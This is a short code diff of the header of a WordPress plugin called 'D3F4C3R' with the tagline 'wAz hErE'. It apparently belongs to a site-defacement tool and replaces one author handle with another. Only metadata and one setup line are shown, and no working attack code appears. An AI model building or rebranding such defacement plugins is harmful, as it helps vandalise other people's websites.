@@ -1,12 +1,12 @@
 <?php
 /**
 * Plugin Name: D3F4C3R
-* Plugin URI: https://profiles.wordpress.org/c0d3Lib
-* Description: c0d3Lib wAz hErE ..
+* Plugin URI: https://profiles.wordpress.org/z0mbie
+* Description: z0mbie wAz hErE ..
 * Version: 3.0
-* Author: c0d3Lib
-* Author URI: https://profiles.wordpress.org/c0d3Lib
-* License: https://profiles.wordpress.org/c0d3Lib
+* Author: z0mbie
+* Author URI: https://profiles.wordpress.org/z0mbie
+* License: https://profiles.wordpress.org/z0mbie
 */
 
 set_time_limit(0);
